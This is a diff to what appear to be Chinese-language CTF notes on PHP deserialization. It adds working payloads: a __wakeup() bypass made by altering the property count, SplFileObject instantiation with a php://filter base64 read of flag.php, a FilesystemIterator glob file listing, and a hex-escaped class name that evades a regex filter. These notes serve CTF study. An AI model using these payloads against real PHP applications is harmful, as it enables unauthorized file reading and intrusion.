@@ -1734,7 +1734,13 @@ http://xxx/?id=0b1111101000
 
   举例：将实际生成的序列化字符串 `O:4:"xctf":1:{s:4:"flag";s:3:"111";}` 改为 `O:4:"xctf":2:{s:4:"flag";s:3:"111";}` 即可绕过 __wakeup()
 
-- 遇到一道题，突破口是 `echo new $_POST['a']($_POST['b']);`，需要调用原生类来读文件。此时使用 `SplFileObject` 类，参数: `a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php`（至于这里使用的伪协议，因为使用伪协议会直接读取文件内容，如果不用伪协议，会调用这个 php 文件，未必会输出内容）
+- 调用原生类
+
+
+  - 遇到一道题，突破口是 `echo new $_POST['a']($_POST['b']);`，需要调用原生类来读文件。此时使用 `SplFileObject` 类 （`SplFileObject('flag.php')`），参数: `a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php`（至于这里使用的伪协议，因为使用伪协议会直接读取文件内容，如果不用伪协议，会调用这个 php 文件，未必会输出内容）
+  - `FilesystemIterator('glob:///fl*')` 可以读根目录下 `fl` 开头的文件 (其他目录同理，该类只能获取具体的某个文件)。
+
+- 使用16进制绕过正则，举例: `O:9:"catalogue":2:{s:5:"class";s:13:"SplFileObject";s:4:"data";s:5:"/flag";}`，由于 `/object/i` 被正则匹配，这里将 `b` 改为十六进制，并在前面加 `\`，将 SplFileObject 前面的 `s` 改为 `S` (大写)即可（这样反序列化就能识别16进制字符串的名称）。最终得到 `O:9:"catalogue":2:{s:5:"class";S:13:"SplFileO\62ject";s:4:"data";s:5:"/flag";}`
 
 反序列化代码示例
 
